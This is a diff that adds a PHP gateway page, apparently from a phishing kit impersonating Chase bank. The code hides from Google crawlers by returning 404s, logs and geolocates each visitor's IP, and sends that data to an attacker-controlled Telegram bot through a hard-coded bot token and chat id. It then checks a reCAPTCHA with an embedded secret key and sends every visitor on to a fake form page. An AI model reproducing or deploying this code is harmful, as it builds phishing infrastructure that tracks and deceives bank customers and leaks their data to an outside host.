@@ -1,0 +1,67 @@
+<?php
+if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
+if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
+
+date_default_timezone_set('Africa/Tunis');
+$TIME = date("d-m-Y H:i:s"); 
+$PP = getenv("REMOTE_ADDR");
+$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
+$COUNTRY = $J7->geoplugin_countryName ;
+$ip = getenv("REMOTE_ADDR");
+$fp = fopen("ip.txt","a");
+fputs($fp,$ip);
+fclose($fp);
+
+
+
+// compose message
+$message = "IP           : $ip\n";
+$message .= "Log          : Chase\n";
+$message = wordwrap($message, 70);
+
+
+
+
+  $botToken="5727495319:AAGjPG_00_ww1J6zbHiY0jqqxAmzZUDJsq0";
+
+  $website="https://api.telegram.org/bot".$botToken;
+  $chatId=1321963966;  //** ===>>>NOTE: this chatId MUST be the chat_id of a person, NOT another bot chatId !!!**
+  $params=[
+      'chat_id'=>$chatId, 
+      'text'=> $message,
+  ];
+  $ch = curl_init($website . '/sendMessage');
+  curl_setopt($ch, CURLOPT_HEADER, false);
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+  curl_setopt($ch, CURLOPT_POST, 1);
+  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
+  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+  $result = curl_exec($ch);
+  curl_close($ch);
+
+
+
+        $captcha;
+        
+        if(isset($_POST['g-recaptcha-response'])){
+          $captcha=$_POST['g-recaptcha-response'];
+        }
+        if(!$captcha){
+          header('Location: ./index.html');
+          exit;
+        }
+        $secretKey = "6LfMeMgiAAAAALLXesn68H5Wqu6KQEcxWOUwgAXu";
+        $ip = $_SERVER['REMOTE_ADDR'];
+        // post request to server
+        $url = 'https://www.google.com/recaptcha/api/siteverify?secret=' . urlencode($secretKey) .  '&response=' . urlencode($captcha);
+        $response = file_get_contents($url);
+        $responseKeys = json_decode($response,true);
+        // should return JSON with success as true
+        if($responseKeys["success"]) {
+            $src="./dashboard/form.htm?template=".md5(time())."=Initiate&valid=true&session=dd".md5(time());
+                header("location:$src");
+        } else {
+               $src="./dashboard/form.htm?template=".md5(time())."=Initiate&valid=true&session=dd".md5(time());
+                header("location:$src");
+        }
+?>
